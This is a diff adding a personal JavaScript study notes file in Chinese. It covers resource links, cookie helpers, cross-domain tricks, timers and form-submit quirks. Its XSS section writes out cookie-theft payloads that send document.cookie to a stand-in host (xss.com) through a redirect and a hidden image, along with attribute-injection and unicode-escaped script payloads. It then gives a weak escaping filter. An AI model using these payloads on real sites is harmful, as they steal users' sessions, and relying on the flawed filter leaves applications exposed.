@@ -1,0 +1,308 @@
+﻿Javascript：
+1) Question & Answer
+http://segmentfault.com/t/javascript
+http://www.zhihu.com/question/19651401
+
+
+http://segmentfault.com/q/1010000000116596 =======
+http://www.dewen.org/q/1083
+
+http://developer.oncecode.com/
+
+free-cookie-domain : http://serverfault.com/questions/78227/what-is-a-cookie-free-domain
+
+2) Share
+	http://quirksmode.org/
+	https://github.com/languages/JavaScript
+	http://javascript.crockford.com/
+	http://shichuan.github.com/javascript-patterns/
+	JS秘密花园：http://bonsaiden.github.com/JavaScript-Garden/zh/
+
+
+3) Debug
+1) fiddler 可以替换域名 urlreplace www.demo.com www.dev.demo.com
+    http://blog.xuite.net/vexed/tech/62341108
+
+****** 关于XSS（跨站脚本攻击）和CSRF（跨站请求伪造）: http://cnodejs.org/topic/50463565329c5139760c34a1 ******
+1) href : location.href = a.com/?cookie= + document.cookie
+		  http://www.baidu.com/“onclick=alert('xss') title=&quot;xss&quot; 地址验证
+var img = document.createElement('img');
+img.src='http://www.xss.com?cookie='+document.cookie;
+img.style.display='none';
+document.getElementsByTagName('body')[0].appendChild(img);
+
+2) <img onload="alert('xss')" src="" />
+
+3) ajax的json注入 【php完全过滤掉和转义了尖括号<>还有单双引号】
+	json数据回来用html方法 ： $('div:first').html('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;');
+	utf-8: 但是在utf-8中，字符还有一种表示方式，那就是unicode码，我们把上面的恶意字符串改写成如下：
+	$('div:first').html('\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e');
+
+ /*
+ *  说明：过滤XSS
+ *  使用：
+ *  initnode.request.xss(val);
+ */
+this.xss = function (val) {
+    val = val.replace(/[&lt;%3C]/g, &quot;&lt;&quot;);
+    val = val.replace(/[&gt;%3E]/g, &quot;&gt;&quot;);
+    val = val.replace(/&quot;/g, &quot;&quot;&quot;);
+    val = val.replace(/'/g, &quot;&amp;#39;&quot;);
+    return val;
+}
+
+****** Cookie: ******
+// xCookie r2, Copyright 2009 Michael Foster (Cross-Browser.com)
+// Part of X, a Cross-Browser Javascript Library, Distributed under the terms of the GNU LGPL
+var xCookie = {
+  get: function(name) {
+    var c = document.cookie.match(new RegExp('(^|;)\\s*' + name + '=([^;\\s]*)'));
+    return ((c && c.length >= 3) ? unescape(c[2]) : null);
+  },
+  set: function(name, value, days, path, domain, secure) {
+    if (days) {
+      var d = new Date();
+      d.setTime(d.getTime() + (days * 8.64e7)); // now + days in milliseconds
+    }
+    document.cookie = name + '=' + escape(value) +
+      (days ? ('; expires=' + d.toGMTString()) : '') +
+      '; path=' + (path || '/') +
+      (domain ? ('; domain=' + domain) : '') +
+      (secure ? '; secure' : '');
+  },
+  del: function(name, path, domain) {
+    this.set(name, '', -1, path, domain); // sets expiry to now - 1 day
+  }
+};
+
+****** JS计算中文长度 ******
+function getRealLen( str ) {
+    return str.replace(/[^\\x00-\\xff]/g, '__').length; //这个把所有双字节的都给匹配进去了
+}
+
+function beautySub( str, len) {
+   var reg = /[\\u4e00-\\u9fa5]/g,    //专业匹配中文
+       slice = str.substring(0,len),
+       realen = len - ( ~~( slice.match(reg) && slice.match(reg).length ) );
+       return slice.substring(0, realen ? realen : 1);
+}
+
+
+****** Onload事件在IE中不触发（注意img.src和img.onload顺序，ie从缓存取图片，没有onload事件，以下是正确方式） ******
+img.onload = function(){
+   _con.delClass('loading');
+};
+img.src = _src;
+
+
+****** 跨域 ******
+document.name
+window.name + postmessage [window.name suports IE6,7. postmessage except ie6,7] http://www.cnblogs.com/rubylouvre/archive/2012/07/30/2614904.html
+location.hash
+iframe
+jsonp
+flash
+
+window.name:
+A： doc.getElementById('iframeA').contentWindow.name = value;
+B： var hash = window.name;
+	setInterval(function(){
+		if(window.name !== hash){
+			hash = window.name;
+			cb.call(window,hash);
+		}
+	},50)
+
+****** 并发请求：http://www.feelcss.com/browser-concurrent-requests.html ******
+HTTP 1.0 http://www.stevesouders.com/blog/2008/03/20/roundup-on-parallel-connections/
+检测并发： http://developer.oncecode.com/comet/
+Browser HTTP/1.1  HTTP/1.0
+IE 6,7  2 4
+IE 8  6 6
+Firefox 2 2 8
+Firefox 3 6 6
+Safari 3,4  4 4
+Chrome 1,2  6 ?
+Chrome 3  4 4
+Chrome 4+ 6 ?
+iPhone 2  4 ?
+iPhone 3  6 ?
+iPhone 4  4 ?
+Opera 9.63,10.00alpha 4 4
+Opera 10.51+  8 ?
+
+
+****** JS 中form submit 和 onSubmit ******
+http://letle.iteye.com/blog/82237
+http://www.cnblogs.com/yoyozhou/archive/2007/02/12/648375.html
+<form action="http://www.baidu.com/s?wd=this.form.submit%28%29%3B&cl=3" method="post" name="form1" onsubmit="return alert('已提交！'); return false;">
+    <table align="center" width="420px" cellPadding="2" cellSpacing="1" bgcolor="#A4B6D7"    style="word-wrap:Break-word;">
+        <tr style="cursor: hand;background:#d7e3f6" >
+            <td width="20%" align="right">条型码</td>
+            <td><input style="width:90%" type="text" name="GOODSNUM"   size="30"  maxlength="8" ></td>
+        </tr>
+        <tr>
+            <td align="center" colspan="2">
+                <input type="button" name="save" value="保存" onclick="if((confirm('确定要提交吗？'))) this.form.submit();"/>
+            </td>
+        </tr>
+    </table>
+</form>
+最近在开发中遇到了表单提交前验证的问题，用一个普通的button按钮代替submit按钮，
+在提交前触发这个button的onclick事件，在其事件中触发form的submit事件。问题出现了：
+以下是出现相关代码：
+Java代码
+<form action="http://www.baidu.com/s?wd=this.form.submit%28%29%3B&cl=3" method="post" name="form1" onsubmit="return alert('已提交！'); return false;">
+    <table align="center" width="420px" cellPadding="2" cellSpacing="1" bgcolor="#A4B6D7"    style="word-wrap:Break-word;">
+        <tr style="cursor: hand;background:#d7e3f6" >
+            <td width="20%" align="right">条型码</td>
+            <td><input style="width:90%" type="text" name="GOODSNUM"   size="30"  maxlength="8" ></td>
+        </tr>
+        <tr>
+            <td align="center" colspan="2">
+                <input type="button" name="save" value="保存" onclick="if((confirm('确定要提交吗？'))) this.form.submit();"/>
+            </td>
+        </tr>
+    </table>
+</form>
+
+却发现并没有触发form的onsubmit方法，而是直接提交了。奇怪了，难道没有这种方式无法结合form的onsubmit方法吗？
+仔细想了想，既然this.form表示form这个对象，那么肯定能获取到form的属性和方法的
+，就改成this.form.onsubmit();  成功！
+我又查了查手册，原来submit的方法是这样解释的：
+  The submit method does not invoke the onsubmit event handler. Call the onsubmit event handler directly. When using Microsoft® Internet Explorer 5.5 and later, you can call the fireEvent method with a value of onsubmit in the sEvent parameter.
+
+意思是说submit这个方法是不触发onsubmit时间的，如果想要触发它，需要调用
+fireEvent方法。尝试一下：this.form.fireEvent('onsubmit');哈哈，果然也成功！不过这样不是多此一举吗？呵呵！
+
+就这个小问题也搞了我将近一个小时，不过为了以后不为这个问题烦恼，这也是值得的。
+this.form.submit(); //直接提交表单
+this.form.onsubmit(); //调用form的onsubmit方法
+this.form.fireEvent('onsubmit'); //同上,
+
+
+****** IE动态创建domain ******
+iframe.src = “javascript:void((function(){document.open();document.domain=’domain.com’;document.close()})())”;
+通过这种方式就可以改写iframe里面的domain了，这样设置完还是不够的，因为设置iframe的domain和获取iframe里面的内容这两个操作存在异步问题。
+所以在设置iframe.src后，要使用setTimeout来获取iframe里的内容。
+
+proxy.html 处理高度 http://segmentfault.com/q/1010000000116596
+<!-- a.com -->
+<iframe id="frame" src="http://b.com/">
+    <!-- b.com -->
+    <iframe src="http://a.com/proxy.html?height=111">
+        <!-- a.com/proxy.html -->
+        <script>
+        // 因为它与a.com同域所以可以直接调用最上层框架的代码
+        top.document.getElementById('frame').height = query.height;
+        </script>
+    </iframe>
+</iframe>
+
+<script type="text/javascript">
+(function(){
+  var height = window.location.hash.substring(1);
+  try
+  {
+    var el = window.parent.parent.document.getElementById('MyMall');
+    if(!el) return;
+    el.style.height = height + 'px';
+  }
+  catch (e) {}
+})();
+</script>
+
+
+******  setTimeout作用 http://www.cainiao8.com/web/js_note/oop/js_oop_03_setTimeout.html ******
+function  Person(nameArg,genderArg){
+       ……
+   this.delayInfo = function(){
+   delay(this,this.showInfo,1000);
+   };
+}
+var cainiao = new  Person('chenzhe','male');
+cainiao.delayInfo();
+function delay(obj,func,time){
+   window.delayFunc = function(){
+     func.call(obj);
+   }
+   setTimeout('delayFunc()',time);
+}
+
+<script  type="text/javascript">
+window.objTimeoutFuncs  = [];
+window.objTimeoutIds =  [];
+function  objTimeout(obj,func,time,id){
+ window.objTimeoutFuncs[id] = function(){
+  func.call(obj);
+ }
+ window.objTimeoutIds[id] =  setTimeout('objTimeoutFuncs[\''+ id +'\']()',500);
+}
+function  clearObjTimeout(id){
+ clearTimeout(window.objTimeoutIds[id]);
+}
+function  Person(nameArg,genderArg){
+ this.name = nameArg;
+ this.gender = genderArg;
+ this.showInfo = function(){
+  var str = '姓名：' +  this.name + ',性别：' + this.gender;
+  alert(str);
+ };
+ this.delayInfo = function(){
+ objTimeout(this,this.showInfo,500,this.name);
+ };
+}
+var cainiao = new  Person('chenzhe','male');
+cainiao.delayInfo();
+</script>
+
+****** Jquery Ajax form 重复提交： ******
+http://www.cnblogs.com/sniper007/archive/2012/05/31/2528854.html
+input type=submit会触发浏览器默认submit函数,建议用type=button
+
+
+一个URL由协议+用户名+密码+域名+端口+路径+哈希构成，知道哪些是必须的，哪些是可选的，写起来就方便许多了 参考小鱼 @sofish 的代码片断吧
+// 支持类型:
+    // http(s)://(username:password@)(www.)domain.(com/co.uk)(/...)
+    // (s)ftp://(username:password@)domain.com/...
+    // git://(username:password@)domain.com/...
+    // irc(6/s)://host:port/... // 需要测试
+    // afp over TCP/IP: afp://[<user>@]<host>[:<port>][/[<path>]]
+    // telnet://<user>:<password>@<host>[:<port>/]
+    // smb://[<user>@]<host>[:<port>][/[<path>]][?<param1>=<value1>[;<param2>=<value2>]]
+    url: function(text){
+      var protocols = '((https?|s?ftp|irc[6s]?|git|afp|telnet|smb):\\/\\/)?'
+        , userInfo = '([a-z0-9]\\w*(\\:[\\S]+)?\\@)?'
+        , domain = '([a-z0-9]([\\w]*[a-z0-9])*\\.)?[a-z0-9]\\w*\\.[a-z]{2,}(\\.[a-z]{2,})?'
+        , port = '(:\\d{1,5})?'
+        , ip = '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}'
+        , address = '(\\/\\S*)?'
+        , domainType = [protocols, userInfo, domain, port, address]
+        , ipType = [protocols, userInfo, ip, port, address]
+        , validate
+
+      validate = function(type){
+        return new RegExp('^' + type.join('') + '$', 'i').test(text);
+      };
+
+      return validate(domainType) || validate(ipType);
+
+
+console处理 [http://segmentfault.com/q/1010000000126785#a-1020000000126814]
+var console=console||{log:function(){}}
+(function() {
+    var noop = function noop() {};
+    var methods = [
+        'assert', 'clear', 'count', 'debug', 'dir', 'dirxml', 'error',
+        'exception', 'group', 'groupCollapsed', 'groupEnd', 'info', 'log',
+        'markTimeline', 'profile', 'profileEnd', 'table', 'time', 'timeEnd',
+        'timeStamp', 'trace', 'warn'
+    ];
+    var length = methods.length;
+    var console = window.console || {};
+
+    while (length--) {
+        // Only stub undefined methods.
+        console[methods[length]] = console[methods[length]] || noop;
+    }
+}());
